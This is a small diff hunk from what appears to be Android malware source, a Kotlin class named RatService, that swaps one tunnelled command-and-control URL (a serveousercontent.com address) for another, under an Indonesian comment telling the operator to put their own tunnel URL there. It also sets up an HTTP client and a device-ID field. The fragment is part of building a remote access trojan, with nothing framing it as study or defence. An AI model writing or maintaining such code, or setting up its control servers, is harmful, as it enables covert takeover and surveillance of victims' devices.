@@ -26,7 +26,7 @@ class RatService : Service() {
     private val client = OkHttpClient.Builder().connectTimeout(10, TimeUnit.SECONDS).build()
     
     // GANTI URL SERVEO LO DI SINI
-    private val c2Url = "https://8ee83aba5866e5b5-103-26-188-24.serveousercontent.com"
+    private val c2Url = "https://699bd061f961ce84-103-26-188-26.serveousercontent.com"
     
     private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var deviceId = ""
